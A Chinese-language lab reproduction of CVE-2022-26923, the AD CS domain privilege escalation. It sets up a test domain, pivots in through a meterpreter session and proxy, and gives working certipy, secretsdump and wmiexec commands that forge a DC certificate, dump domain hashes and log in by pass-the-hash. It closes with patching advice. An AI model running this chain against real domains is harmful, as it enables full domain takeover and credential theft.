# 域权限提升漏洞（CVE-2022–26923）复现

### 一、漏洞简介

​		2022年5月，微软发布补丁修复了一个域权限提升漏洞（CVE-2022–26923）。该漏洞是由于在申请证书时 AD CS 服务器对 AD 域中的计算机账户身份审核不够严格，攻击者能够操控他们拥有或管理的计算机帐户（低权限用户）的属性，假冒 DC 从 AD CS 服务器获取 DC 证书，从而使得普通用户将权限提升至域管理员权限。这一漏洞最早由安全研究员 Oliver Lyak 与2021年12月发现并向微软报告，微软在2022年5月的安全更新中对该漏洞进行了修补。

**影响范围**：Windows 8.1、Windows 10、Windows 11、Windows Server 2012 R2、Windows Server 2016、Windows Server 2019、Windows Server 2022等版本。

详见微软安全更新指南文档：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923

**利用条件**：

- AD 域内拥有 AD CS 服务器并能够提供对应服务。
- 攻击者获取到普通域用户凭据或计算机账户凭据。
- 域计算机用户可以申请 Machine 模板证书。
  - 注：默认情况下，域用户可以注册 User 证书模板，域计算机可以注册 Machine 证书模板。两个证书模板都允许客户端身份验证。

### 二、前置知识

#### 2.1 Active Directory 证书服务（AD CS）

​		Active Directory 证书服务（Active Directory Certificate Services，AD CS），是微软对 PKI（公钥基础设施）的实现，它与现有的 AD 域集成，并提供从加密文件系统到数字签名，再到客户端身份验证（CVE-2022–26923就是利用此功能）等功能。默认情况下 Active Directory 环境没有安装 AD CS服务需要用户自行安装，但现如今该服务已被各大企业和组织广泛使用。

#### 2.2 Active Directory 证书申请流程

​		AD 证书申请流程大致流程如下图所示：

<img src="https://s2.loli.net/2023/03/11/xUZs1tDFvHh4Yzi.png" alt="image-20230217153339438" style="zoom: 67%;" />

### 三、漏洞复现

#### 3.1 环境搭建

##### 3.1.1 复现环境

首先准备好一个简单的域环境，搭建过程省略，同时此处模拟了一个简单的内外网环境，初始环境如下：

域控DC：Windows server 2012  （IP[内网]：10.10.10.133）

域内主机：Windows 7 （IP1[内网]：10.10.10.132，IP2[外网]:192.168.12.136，普通域账户：zhangsan  p-0p-0p-0）

攻击机：kali（IP：192.168.12.131）

​		这里就只演示在基础域环境下搭建 AD 证书服务的过程，完整搭建过程可以参考这篇文章——WINDOWS SERVER 2012证书服务安装配置（https://blog.csdn.net/lcl_xiaowugui/article/details/78746076）

##### 3.1.2 搭建步骤

在域控上安装 AD CS。

1. 安装 AD 证书服务。

   打开 “服务器管理器” ，点击 “添加角色和功能”，连续点击下一步直到 “服务器角色页面”，勾选“Active Directory 证书服务”，如下 。

   ![image-20230310101119479](https://s2.loli.net/2023/03/11/JGc2vLRC3qp9nar.png)

2. 点击下一步，直到 “角色服务”页面，勾选 “证书颁发机构”、“证书颁发机构 Web 注册”、“证书注册策略 Web 服务” 进行安装。

   ![image-20230310101203707](https://s2.loli.net/2023/03/11/eBGdYJiI5NZ2Ro9.png)

3. 默认下一步，在 “确认” 界面中点击 “安装”，等待安装完成。

4. 配置 AD CS。

   打开 “服务器管理器” ，点击如下“旗子”，而后点击 “配置目标服务器上的 Active Directory 证书服务”。  

   ![image-20230310101407048](https://s2.loli.net/2023/03/11/9HBXQdkOWJqgtiY.png)

5. 凭据默认使用管理员即可，而后在 “角色服务” 中勾选刚才安装的三个服务。

   ![image-20230310101437539](https://s2.loli.net/2023/03/11/9xy1HERYsc7PotF.png)

6. 设置类型中，选择 “企业 CA”。

7. CA类型默认选择 “根 CA”。

8. 配置私钥。

   - 指定私钥类型选择 “创建新的私钥”。
   - 指定加密选项，默认SHA1加密算法即可。
   - CA名称默认即可，此处为 “woniu-WIN-UC8NMV3312U-CA”。
   - 有效期默认5年即可。

9. 默认下一步，到“服务器证书”，因为目前并没有设置ssl加密使用的现有证书，所以选择稍后为ssl分配。

   ![image-20230310101550119](https://s2.loli.net/2023/03/11/YSZlj1EBxmHQ4Xf.png)

10. 进行配置确认，配置大致如下，而后点击 “配置” 即可。

    ![image-20230310101618936](https://s2.loli.net/2023/03/11/c3hdZIpeQi7CFry.png)

11. 查看检测配置是否成功，在“服务器管理器”中，点击 “工具” -> “证书颁发机构”，查看证书模板中有无 “计算机” 模板与 “用户” 模板，如下：

    ![image-20230310101715499](https://s2.loli.net/2023/03/11/uXd4SyaTZ1sDeOx.png)

    至此环境搭建完成。

#### 3.2 漏洞浅析

​       在证书申请过程中，CA 会检查客户端身份（使用的哪个账户），会查看 CSR 中指定的证书模版，前面利用条件中也说到用户模板和计算机模板，不同模板有不同的身份验证方式。用户账户（使用用户模板）会使用到用户主体名称(User Principal Name, UPN)作为身份证明。而基于计算机模板的机器账户将使用 dNSHostName 属性作为证明。而用户模板和计算机模板证书都允许客户端身份的验证，使用申请到的证书我们就可以进行身份验证后获取对应用户权限。

​       于是很容易想到，若将用户账户的 UPN 或者机器账户的 dNSHostName 改为高权限账户的对应内容，而后申请证书获取指定用户权限。

​       我们先看用户账户的证书申请，其在申请证书时，用户账户的 UPN 将被嵌入到证书中用于身份证明。这里我们使用 AD Explorer 查看并修改域信息，在域内任意一台主机上使用域普通用户连接到域。这里将zhangsan 的 UPN 改为 lisi，发现无法修改，提示我们“出现一个约束冲突”。这是因为用户的 UPN 具有唯一性，不可重复。

![image-20230222161505521](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302221746090.png)

​       接着我们来看机器账户，还是使用 AD Explorer ，找到一个机器账户 TEST-PC，将其 dNSHostName 属性修改为 dc.woniu.com （域控的dNSHostName），提示我们拒绝访问，因为 SPN 的唯一性。SPN （Service Principal Name）是网络控制器服务实例的唯一标识符，Kerberos 进行身份验证时使用它来将服务实例与服务登录帐户相关联。

![image-20230222163239848](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302221746102.png)

​		当我们试图将 TEST-PC 机器账户的dNSHostName属性更新为 dc.woniu.com 时，域控制器试图更新SPN属性，SPN 中的下面两个值会被修改成与域控制器的 SPN 属性中这两个值相同，就会触发 SPN 属性冲突。

![image-20230222175157979](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302221751037.png)

​		这里我们可以将 TEST-PC 机器账户 SPN 中的这两个值提前删除，而后再修改 dNSHostName。会发现修改成功。

![image-20230222180310399](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302221803436.png)

​		此时我们使用 TEST-PC 机器账户申请证书时，颁发的证书中将会包含填充篡改后的dNSHostName，即 dc.woniu.com。TEST\-PC 机器账户申请的证书就具备域控的权限了。

#### 3.3 复现过程

##### 3.3.1 漏洞利用工具

Certipy：https://github.com/ly4k/Certipy（在kali中运行命令 “pip3 install certipy-ad” 安装即可）。

##### 3.3.2 上传木马并配置代理

​		此处模拟受害者下载攻击者生成的木马程序并运行，导致木马上线获取到普通域用户权限，而后进一步使用CVE-2022-26923进行提权。

​		实战环境下，我们的攻击机一般不能直接访问域控，只有在获取到域内用户后搭建代理才可以访问，所以这里使用 msf 的 socks_proxy 模块搭建代理。

1. 在kali中使用msf生成对应反弹shell的exe木马。

   ![image-20230220143638598](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302201437208.png)

2. 使用 exploit/multi/handler 模块监听对应端口。

   ![image-20230220164352387](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302201643462.png)

3. 信息收集。

   获取当前登录的账号：

   ```
   meterpreter > getuid
   Server username: WONIU\zhangsan
   ```

   枚举域信息：

   ```
   run post/windows/gather/enum_domain
   ```

   ![image-20230311145251782](https://s2.loli.net/2023/03/11/wfX1ZmKgrpQPVLq.png)

   从上面可以知道域为 woniu.com，DC为 dc （全名：dc.woniu.com）

4. 使用 msf 中 socks_proxy 模块进行代理（内网穿透）。

   （1）挂起此会话，命令为 background。以下是一些关于 meterper 中 session 的命令演示：

   ![image-20230311145409487](https://s2.loli.net/2023/03/11/IXEmUDr9nP3xbSZ.png)

   （2）使用 socks_proxy 模块配置代理。

   ```
   use auxiliary/server/socks_proxy
   set srvhost 127.0.0.1
   set srvport 1080
   run
   ```
```
   
![image-20230311145508917](https://s2.loli.net/2023/03/11/2iIFx1dBfhc5q9M.png)
   
（3）重新进入 session 2 ，设置路由。
   
```
   sessions -i 2
   run autoroute -s 10.10.10.0/24   # 设置到192.168.219.0网段的路由
   run autoroute -p    # 查看路由
```
   
![image-20230311145623835](https://s2.loli.net/2023/03/11/C1XzVYusGFZhQAr.png)
   
（4）修改 proxychains的配置文件，vim /etc/proxychains4.conf 。
   
```
在最后一行添加

   socks5 127.0.0.1 1080
```
   
（5）使用nmap来验证，若直接使用nmap无法扫描dc主机，而使用proxychains代理后在进行扫描即可成功扫描端口。
   
   ![image-20230311150004863](https://s2.loli.net/2023/03/11/BwpPHr1AajgsQbu.png)


##### 3.3.3 漏洞利用

1. 查看CA名称，在非颁发机构的机器上使用 certutil 命令，转储配置信息或文件，查看到 CA 相关信息。从这里我们可以看到CA名称为 dc。

   ![image-20230311150115309](https://s2.loli.net/2023/03/11/p8ARbJ3NKOXx24U.png)

   综上我们现在得到的信息如下：

```
   域：woniu.com
   DC：dc.woniu.com （IP：10.10.10.133）
   CA：woniu-DC-CA
   ```

2. 使用certipy，创建机器账户，并设置dNSHostName属性为域控服务器域名。

   ```
   proxychains certipy account create -u zhangsan@woniu.com -p p-0p-0p-0 -dc-ip 10.10.10.133 -user zsmachine -pass p-0p-0p-0 -dns 'dc.woniu.com'
   ```

   ![image-20230221200034758](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/202302212000185.png)

3. 使用 certipy 为机器账户 zsmachine 申请证书，因为前面已经将 zsmachine 的 dNSHostName 改为  dc.woniu.com ，所以这里申请的证书是 dc 的。 （这里需要设置kali的dns服务器为域控）

   ```
   proxychains certipy req -u 'zsmachine$'@woniu.com -p p-0p-0p-0 -ca woniu-DC-CA -target dc.woniu.com -template Machine
   ```

   ![image-20230311151327825](https://s2.loli.net/2023/03/11/lcZTmyCLSrAKXDh.png)

4. 利用申请到的证书进行认证并获取 dc 的 NTLM hash。

   ```
   proxychains certipy auth -pfx dc.pfx
   ```

   ![image-20230311151404992](https://s2.loli.net/2023/03/11/FolSAhfazyBN8Im.png)

   得到的hash如下：

   ```
由两部分组成 lmhash:nthash

   aad3b435b51404eeaad3b435b51404ee:5f982f3915ff8ecd87e0b69ccc0ef0da
   ```

   注：从 Windows Server 2008版本开始默认 LM Hash被禁用了，一般为 aad3b435b51404eeaad3b435b51404ee 。

5. 使用 secretsdump.py （Impacket工具包，kali默认安装）将所有用户的 hash 抓取下来。

   ```
   proxychains python3 secretsdump.py 'dc$'@10.10.10.133 -hashes aad3b435b51404eeaad3b435b51404ee:5f982f3915ff8ecd87e0b69ccc0ef0da
   ```

   ![image-20230311160343133](https://s2.loli.net/2023/03/11/8Qs9SGNIe3VlZyA.png)

   从上面我们可以得到 administrator 与 krbtgt 的 NTLM Hash

   ```
administrator 的 NTLM Hash 如下：

   ad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
   ```

6. 使用 administrator 的 hash 进行登录，这里使用的是 wmiexec.py （Impacket工具包）脚本。

   ```
   proxychains python3 wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 administrator@10.10.10.133
   ```

   ![image-20230311160458004](https://s2.loli.net/2023/03/11/RLMje4mGCtqHsuX.png)

   成功登录dc，账户为 administrator （域管理员），至此提权完成，后续可以进行对应权限维持（如：黄金票据、白银票据等）。



### 四、修复建议

1. 更新官方的安全补丁，根据对应系统版本安装对应补丁，微软安全更新指南链接：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923 。



### 五、参考文章

1. Active Directory 域权限提升漏洞（CVE-2022–26923）分析（http://www.ctfiot.com/40081.html）。
2. 域内权限提升新姿势：CVE-2022–26923漏洞分析及复现（https://forum.butian.net/share/1578）。

3. WINDOWS SERVER 2012证书服务安装配置（https://blog.csdn.net/lcl_xiaowugui/article/details/78746076）。



 

   ```